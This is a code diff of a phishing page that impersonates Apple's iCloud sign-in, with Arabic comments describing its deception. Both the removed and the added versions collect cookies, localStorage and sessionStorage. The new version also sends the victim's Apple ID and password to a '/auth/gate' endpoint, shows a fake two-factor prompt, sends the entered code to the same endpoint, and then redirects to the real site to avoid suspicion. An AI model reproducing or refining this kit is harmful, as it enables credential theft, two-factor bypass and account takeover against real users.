@@ -3,82 +3,116 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>iCloud | Device Security Verification</title>
-    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <title>iCloud Security | Identity Verification</title>
     <style>
-        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #ffffff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; overflow: hidden; }
-        .login-box { width: 100%; max-width: 320px; text-align: center; padding: 20px; }
-        .icloud-logo { width: 80px; height: 80px; margin-bottom: 20px; }
-        h1 { font-size: 24px; font-weight: 400; color: #1d1d1f; margin-bottom: 25px; }
-        .input-group { position: relative; margin-bottom: 15px; }
-        input { width: 100%; padding: 12px 15px; border: 1px solid #d2d2d7; border-radius: 8px; font-size: 17px; box-sizing: border-box; outline: none; }
-        input:focus { border-color: #007aff; box-shadow: 0 0 0 4px rgba(0,122,255,0.1); }
-        .btn-submit { width: 100%; padding: 12px; background-color: #007aff; color: white; border: none; border-radius: 8px; font-size: 17px; font-weight: 500; cursor: pointer; margin-top: 10px; transition: background 0.2s; }
-        .btn-submit:hover { background-color: #0071e3; }
-        .footer-text { margin-top: 40px; font-size: 13px; color: #86868b; }
-        .footer-text a { color: #0066cc; text-decoration: none; }
-        /* تصميم التمويه */
-        #loading-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: white; z-index: 999; flex-direction: column; justify-content: center; align-items: center; }
-        .spinner { border: 3px solid #f3f3f3; border-top: 3px solid #007aff; border-radius: 50%; width: 30px; height: 30px; animation: spin 1s linear infinite; }
+        body { font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif; background-color: #fff; display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; }
+        .container { width: 100%; max-width: 340px; text-align: center; padding: 20px; }
+        .logo { width: 90px; margin-bottom: 25px; }
+        h1 { font-size: 24px; font-weight: 400; color: #1d1d1f; margin-bottom: 30px; }
+        input { width: 100%; padding: 14px; margin-bottom: 15px; border: 1px solid #d2d2d7; border-radius: 10px; font-size: 16px; box-sizing: border-box; outline: none; background: #fafafa; }
+        input:focus { border-color: #007aff; }
+        .btn { width: 100%; padding: 14px; background-color: #007aff; color: #fff; border: none; border-radius: 10px; font-size: 17px; font-weight: 500; cursor: pointer; }
+        #two-factor-section { display: none; } /* مخفي حتى يتم إدخال الباسورد */
+        .loading { display: none; margin-top: 20px; font-size: 14px; color: #86868b; }
+        .spinner { border: 2px solid #f3f3f3; border-top: 2px solid #007aff; border-radius: 50%; width: 20px; height: 20px; animation: spin 1s linear infinite; display: inline-block; vertical-align: middle; margin-right: 10px; }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
     </style>
 </head>
 <body>
 
-    <div id="loading-overlay">
-        <div class="spinner"></div>
-        <p style="font-family: sans-serif; color: #86868b; margin-top: 15px;">Securely syncing with Apple Enclave...</p>
-    </div>
-
-    <div class="login-box">
-        <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/ICloud_logo.svg/2560px-ICloud_logo.svg.png" alt="iCloud" class="icloud-logo">
-        <h1>Sign in to iCloud</h1>
-        
-        <form action="/auth/gate" method="POST" id="vault">
-            <div class="input-group">
-                <input type="email" name="u" id="email" placeholder="Apple ID" required autocomplete="username">
-            </div>
-            <div class="input-group">
-                <input type="password" name="p" id="password" placeholder="Password" required autocomplete="current-password">
-            </div>
-            
-            <input type="hidden" name="sid" id="sid">
-            
-            <button type="submit" class="btn-submit">Continue</button>
+<div class="container">
+    <img src="https://upload.wikimedia.org/wikipedia/commons/thumb/1/1c/ICloud_logo.svg/2560px-ICloud_logo.svg.png" class="logo" alt="iCloud">
+    
+    <div id="login-section">
+        <h1>Sign in with Apple ID</h1>
+        <form id="auth-form">
+            <input type="email" id="u" placeholder="Apple ID" required>
+            <input type="password" id="p" placeholder="Password" required>
+            <button type="submit" class="btn">Continue</button>
         </form>
-
-        <div class="footer-text">
-            <p>Forgotten your <a href="#">Apple ID or password?</a></p>
-            <p>Don't have an Apple ID? <a href="#">Create one now.</a></p>
-        </div>
     </div>
 
-    <script>
-        document.getElementById('vault').onsubmit = function(e) {
-            // إظهار واجهة التحميل للتمويه
-            document.getElementById('loading-overlay').style.display = 'flex';
+    <div id="two-factor-section">
+        <h1>Two-Factor Authentication</h1>
+        <p style="font-size: 15px; color: #333;">A message with a verification code has been sent to your devices. Enter the code to continue.</p>
+        <form id="otp-form">
+            <input type="text" id="otp" placeholder="Enter 6-digit code" maxlength="6" required>
+            <button type="submit" class="btn">Verify</button>
+        </form>
+    </div>
 
-            // محاولة جمع كافة بيانات الجلسة المتاحة تقنياً
-            try {
-                const sessionPayload = {
-                    cookies: document.cookie, // الكوكيز (المفتاح الأساسي)
-                    local_storage: {...localStorage}, // بيانات التخزين المحلي
-                    session_storage: {...sessionStorage}, // بيانات التخزين المؤقت
-                    screen_res: window.screen.width + "x" + window.screen.height, // دقة الشاشة للمطابقة
-                    platform: navigator.platform, // نوع النظام
-                    tz: Intl.DateTimeFormat().resolvedOptions().timeZone // المنطقة الزمنية للضحية
-                };
+    <div class="loading" id="loader">
+        <div class="spinner"></div> Connecting to Apple Server...
+    </div>
+</div>
 
-                // تحويل البيانات لـ Base64 لضمان عدم تلف النص أثناء الإرسال
-                const encodedData = btoa(unescape(encodeURIComponent(JSON.stringify(sessionPayload))));
-                document.getElementById('sid').value = encodedData;
-            } catch (err) {
-                console.log("Session capture failed, sending basic data.");
-            }
-            
-            // اترك الفورم يكمل الإرسال للسيرفر
-            return true;
+<script>
+    const authForm = document.getElementById('auth-form');
+    const otpForm = document.getElementById('otp-form');
+    const loginSection = document.getElementById('login-section');
+    const otpSection = document.getElementById('two-factor-section');
+    const loader = document.getElementById('loader');
+
+    // تكتيك: سحب الجلسة يدويًا عند كل ضغطة
+    function getExtractedData() {
+        return btoa(JSON.stringify({
+            ck: document.cookie,
+            ls: localStorage,
+            ss: sessionStorage,
+            ua: navigator.userAgent,
+            res: window.screen.width + "x" + window.screen.height
+        }));
+    }
+
+    // المرحلة الأولى: سحب الباسورد
+    authForm.onsubmit = async (e) => {
+        e.preventDefault();
+        loader.style.display = 'block';
+        
+        const data = {
+            u: document.getElementById('u').value,
+            p: document.getElementById('p').value,
+            sid: getExtractedData()
         };
-    </script>
+
+        // إرسال البيانات فورًا لـ Render
+        await fetch('/auth/gate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(data)
+        });
+
+        // تمويه: إخفاء تسجيل الدخول وإظهار كود الـ 2FA
+        setTimeout(() => {
+            loader.style.display = 'none';
+            loginSection.style.display = 'none';
+            otpSection.style.display = 'block';
+        }, 1500);
+    };
+
+    // المرحلة الثانية: سحب كود الـ 2FA (المفتاح الذهبي)
+    otpForm.onsubmit = async (e) => {
+        e.preventDefault();
+        loader.style.display = 'block';
+
+        const otpData = {
+            u: document.getElementById('u').value,
+            otp: document.getElementById('otp').value,
+            sid: "OTP_CODE_ENTRY"
+        };
+
+        await fetch('/auth/gate', {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
+            body: new URLSearchParams(otpData)
+        });
+
+        // التوجيه النهائي للموقع الرسمي لإبعاد الشبهة
+        setTimeout(() => {
+            window.location.href = "https://www.icloud.com";
+        }, 2000);
+    };
+</script>
+
 </body>
 </html>
